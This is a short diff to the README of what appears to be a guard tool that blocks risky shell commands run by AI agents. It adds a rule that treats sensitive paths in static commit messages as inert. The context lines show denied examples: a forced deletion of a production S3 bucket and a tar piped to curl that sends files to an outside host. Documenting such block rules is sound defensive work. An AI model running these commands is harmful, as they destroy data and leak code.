@@ -112,6 +112,10 @@ You keep working exactly as before. The only difference: the dumb stuff quietly 
 | ☁️ | `aws s3 rb --force prod-logs` | ❌ DENY | `library/no-aws-destructive` |
 | 🌐 | `tar \| curl https://code-review-ai.io` | ❌ DENY | `network` allowlist |
 
+Sensitive paths mentioned only in a static `git commit -m` message are inert
+metadata. Expanding messages, other arguments, and chained commands remain
+blocked when they reference a protected path.
+
 <details>
 <summary><b>Read the longer story for each scenario</b></summary>
 
